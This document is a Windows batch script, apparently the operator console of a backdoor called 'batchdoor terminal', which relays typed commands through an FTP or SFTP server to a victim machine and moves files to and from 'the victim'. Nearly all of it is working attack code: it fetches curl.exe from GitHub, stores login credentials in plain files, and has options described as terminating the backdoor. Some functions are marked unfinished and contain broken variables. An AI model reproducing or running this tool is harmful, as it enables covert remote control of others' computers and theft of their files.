@echo off
setlocal enablesetdelayedexpansion
title batchdoor terminal v1.2
if not exist curl.exe (

wget https://github.com/gato001k1/project-batch-message-app/raw/main/curl.exe
set "curlpath=%~dp0curl.exe"
goto stof

) else (
    set "curlpath=%~dp0curl.exe"
goto stof
)
:stof
cls
echo ------------------------------------------------------------------------------------------------------------------------
echo Use config to set up a connection
echo Use connect to connect to the server
echo ------------------------------------------------------------------------------------------------------------------------
set /p menu= Enter the option:#
if "%menu%"=="config" goto conf

if "%menu%"=="connect" goto connect

echo the option selected does not exist :(
    pause
    goto stof


:conf
cls
Echo Enter the IP address or the Host name of the SFTP or FTP server:
Echo Do not put the "sftp://"
set /p ftpServer=#:
Echo Enter the username to log in to the SFTP or FTP server:
set /p ftpUsername=#:
Echo Enter the password to log in to the SFTP or FTP server:
set /p ftpPassword=#:
rem user creator system   users
    echo creating user
rem           
    echo %ftpUsername%>username
    echo %ftpServer%>server
    echo %ftpPassword%>password
cls
:cl
echo is the server Sftp Y, Ftp N,?
set /p sftpchoose=(Y,N):
if "%sftpchoose%"=="y" (
    echo o > sftp
    set sftpmode="sftp"
    cls
    goto confix
    )
if "%sftpchoose%"=="n" (
    set sftpmode="ftp"
    cls
    goto confix
    )
    echo option not valid
    pause
    cls
    goto cl
    :confix
echo > haks
    set /p username=<username
set /p password=<password
set /p server=<server
echo %username%
echo %password%
echo %server%
echo o > t
echo "%curlpath%" -u %username%:%password% -T "t" %sftpmode%://%server% -k
"%curlpath%" -u %username%:%password% -T "t" %sftpmode%://%server% -k 2>nul
echo Checking connection...
if %ERRORLEVEL% EQU 0 (
   echo  Connection OK!
   pause
   goto stof
) else (
    echo Connection error.
    pause
    goto stof
)

:connect
set /p username=<username
set /p password=<password
set /p server=<server
echo %username%
echo %password%
echo %server%
if EXIST sftp (
 set "sftpmode=sftp"
) else (
set "sftpmode=ftp"
)
echo %sftpmode%
echo o > t
"%curlpath%" -u %username%:%password% -T "t" %sftpmode%://%server% -k
echo Checking connection...
if %ERRORLEVEL% EQU 0 (
   echo  Connection OK!
   goto af
) else (
    echo Connection error.
    pause
    goto stof
)
cls
:af
start display.bat
start recive.bat
goto l
:l
cls
echo use "*" for internal commands
echo commands: exit, destroy, exitserver, upload, May or not work.
echo Server credentials: usr: %username% usrn: Terminal pass: %password% serv: %server%
set /p terminal= Terminal#:

if "%terminal%"=="*destroy" (
echo Wip
goto connect
)

if "%terminal%"=="*exit" (
echo Wip    
    goto stof
)

if "%terminal%"=="*exitserver" (
goto exts
)

if "%terminal%"=="*upload" (
goto upload
)

if "%terminal%"=="*download" (
goto download
)
:SEND
echo Terminal:# %terminal% >> haks
echo %terminal% > com
echo > text.refresh
"%curlpath%" -u %username%:%password% -T "com" %sftpmode%://%server% -k 2>nul
if %ERRORLEVEL% EQU 0 (

   echo  sended OK!
) else (
    echo Error sending com file
    pause
)

goto l


:exts
set /p war=Warning this will terminate the backdoor (Y,N)
if "%war%"=="y" (
    goto fn
) else (
goto l
)


:fn
set "terminal=exitser"
goto send

:upload
set /p ssk=insert the file address where the file is located or the file name if on same directory:#
set /p ssk1=Enter the name of the file ex: money.txt:#
echo Sending...
"%curlpath%" -u %username%:%password% -T "%ssk%" %sftpmode%://%server% -k
 set "terminal="%curlpath2%" --user %username2%:%password2% -o "%ssk1%" %sftpmode2%://%server2%/%ssk1% -k"
 pause
goto send


:download
echo WIP 
echo Not Working.
set /p download=Enter the file path or file name if on same directory of the victim:#
set /p downloadname=Enter the name of the file to download from the victim ex: money.txt:#
set "terminal="%curlpath2%" -u %username2%:%password2% -T "%download%" %sftpmode2%://%server2% -k"
echo Terminal:# %terminal% >> haks
echo %terminal% > com
echo > text.refresh
"%curlpath%" -u %username%:%password% -T "com" %sftpmode%://%server% -k 2>nul
if %ERRORLEVEL% EQU 0 (

   echo  sended OK!
) else (
    echo Error sending com file
    pause
)
:loopf
    "%curlpath%" --user %username%:%password% -o %downloadname% %sftpmode%://%server%/%downloadname% -k
if %ERRORLEVEL% EQU 0 (
goto loopf
) else (
    goto l
)
